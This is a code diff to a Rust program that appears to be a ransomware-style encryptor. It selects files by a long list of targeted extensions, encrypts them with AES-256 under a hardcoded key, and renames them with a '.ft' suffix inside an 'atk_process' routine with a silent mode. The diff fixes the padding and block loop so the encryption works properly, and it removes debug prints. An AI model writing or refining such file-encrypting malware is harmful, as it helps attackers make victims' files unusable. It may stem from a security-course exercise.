@@ -8,7 +8,6 @@ use crate::Args;
 use crate::utils;
 
 fn check_extension(extension: &OsStr) -> bool {
-    println!("BB");
     let valid_ext = [
         ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot",
         ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp",
@@ -36,24 +35,24 @@ fn check_extension(extension: &OsStr) -> bool {
 }
 
 fn crypt_content(path: &PathBuf, content: Vec<u8>) -> std::io::Result<()> {
-    let mut i = 0;
-    let mut x = 16;
     let key = [48u8; 32];
     let key_array = GenericArray::clone_from_slice(&key);
     let cipher = Aes256::new(&key_array);
+    
+    let mut new_content = content.clone();
+    let new_size = 16 - (content.len() % 16);
+    new_content.extend(vec![new_size as u8; new_size]);
+    
     let mut new_path = path.clone();
-    new_path.set_extension("ft");
+    new_path.as_mut_os_string().push(".ft");
     let mut dest_aes = File::create(path)?;
     rename(path, new_path)?;
-    while x < content.len() {
-        let mut block = GenericArray::clone_from_slice(&content[i..x]);
+    
+    let mut i = 0;
+    while i < new_content.len() {
+        let mut block = GenericArray::clone_from_slice(&new_content[i..i + 16]);
         cipher.encrypt_block(&mut block);
         dest_aes.write_all(&block)?;
-        if x + 16 > content.len() {
-            x += content.len() - x;
-        } else {
-            x += 16;
-        }
         i += 16;
     }
     Ok(())
@@ -68,7 +67,6 @@ pub fn atk_process(path: &PathBuf, args: &Args) {
                 match content {
                     Some(res) => {
                         if let Err(_e) = crypt_content(path, res) {
-                            println!("CC");
                             return;
                         }
                         if !args.silent {
